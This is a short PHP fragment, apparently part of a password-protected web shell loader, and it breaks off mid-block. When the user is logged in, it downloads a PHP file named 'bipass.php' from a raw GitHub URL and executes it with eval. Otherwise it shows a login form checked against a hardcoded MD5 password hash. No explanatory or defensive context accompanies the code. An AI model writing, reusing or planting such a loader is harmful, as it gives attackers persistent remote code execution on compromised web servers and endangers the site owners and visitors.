...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/mangoleh098/bippasd/refs/heads/main/bipass.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '40e95a9d199f556a647a70e62c459439'; // Replace this with your MD5 hashed password
